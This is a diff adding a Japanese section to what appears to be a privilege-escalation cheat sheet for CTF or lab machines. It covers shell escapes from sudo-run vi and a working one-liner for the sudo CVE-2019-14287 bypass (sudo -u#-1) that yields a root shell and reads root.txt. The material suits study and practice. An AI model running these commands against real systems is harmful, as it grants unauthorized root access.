@@ -156,6 +156,69 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 sudo vim -c ':!/bin/sh'
 ```
 
+`sudo -l` で **特定ファイルだけ** 編集可のとき（例: `(ALL, !root) NOPASSWD: /usr/bin/vi /path/to/allowed-file`）:
+
+```bash
+# sudo vi だけだと root として実行しようとして拒否される
+sudo -u <user> /usr/bin/vi /path/to/allowed-file
+```
+
+vi 内でシェル escape（**1 コマンドずつ**）:
+
+```vim
+:set shell=/bin/bash
+:shell
+```
+
+または:
+
+```vim
+:!/bin/bash
+```
+
+- **`-u` 指定 user として** vi が動くだけでは root シェルにならない（`:e /root/root.txt` も Permission denied）
+- root が必要 → 下の **CVE-2019-14287**
+
+### sudo `(ALL, !root)` — CVE-2019-14287
+
+`sudo -l` に `(ALL, !root) NOPASSWD: ...` があると **`-u root` は明示禁止**。古い sudo（&lt; 1.8.28）では **`-u#-1` が uid 0（root）として解釈**され bypass できる。
+
+```bash
+sudo -u#-1 /usr/bin/vi /path/to/allowed-file
+```
+
+vi 内:
+
+```vim
+:!/bin/bash
+```
+
+```bash
+id                  # uid=0(root)
+cat /root/root.txt
+```
+
+ワンライナー:
+
+```bash
+sudo -u#-1 /usr/bin/vi -c ':!/bin/bash' /path/to/allowed-file
+```
+
+別表記（同じ意味）:
+
+```bash
+sudo -u#4294967295 /usr/bin/vi /path/to/allowed-file
+```
+
+| コマンド | 結果 |
+|----------|------|
+| `sudo vi ...` | root として実行 → **拒否** |
+| `sudo -u <user> vi ...` | 指定 user → **root ファイル不可** |
+| `sudo -u#-1 vi ...` | **root bypass** |
+
+- パスは **`sudo -l` の引数と完全一致**させる（`/usr/bin/vi` とファイルパスをそのまま）
+- 参考: [GTFOBins vi](https://gtfobins.github.io/gtfobins/vi/), [CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)
+
 ### tar で昇格
 
 ```bash
